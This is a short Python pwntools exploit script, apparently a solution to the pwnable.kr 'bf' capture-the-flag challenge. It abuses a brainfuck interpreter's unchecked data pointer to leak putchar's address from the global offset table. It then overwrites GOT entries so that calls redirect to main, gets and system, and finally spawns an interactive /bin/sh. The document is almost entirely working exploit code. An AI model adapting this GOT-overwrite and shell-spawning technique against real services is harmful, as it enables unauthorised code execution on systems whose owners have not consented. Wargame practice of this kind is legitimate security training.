from pwn import *

sh = remote("pwnable.kr", 9001)
libc = ELF("./bf_libc.so")
payload = "." + "<" * 112 + ".>" * 4  # leak putchar
payload += "<" * 4 + ",>" * 4  # overwrite putchar with main
payload += "<" * 8 + ",>" * 4  # overwrite memset with gets
payload += "<" * 32 + ",>" * 4 + "."  # overwrite gets with system
sh.recvuntil("type some brainfuck instructions except [ ]")
sh.sendline(payload)
putchar_leak = u32(sh.recvn(6)[2:])

offset = putchar_leak - libc.symbols["putchar"]
system_addr = offset + libc.symbols["system"]
gets_addr = offset + libc.symbols["gets"]
main_addr = 0x8048671
sh.send(p32(main_addr) + p32(gets_addr) + p32(system_addr))
sh.sendline("/bin/sh")
sh.interactive()

# BrainFuck? what a weird language..
